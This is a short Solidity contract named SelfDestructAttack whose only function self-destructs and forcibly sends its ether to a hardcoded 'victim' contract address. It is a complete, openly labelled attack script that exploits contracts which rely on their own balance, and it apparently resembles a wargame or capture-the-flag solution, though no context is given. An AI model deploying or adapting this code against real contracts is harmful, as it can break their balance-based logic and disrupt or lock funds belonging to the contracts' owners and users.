// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract SelfDestructAttack {
    address internal immutable victim = 0x46F1fC1a4C79a254537803d8ba984E396408e0b3;
    function attack() public payable {
        selfdestruct(payable(victim));
    }
}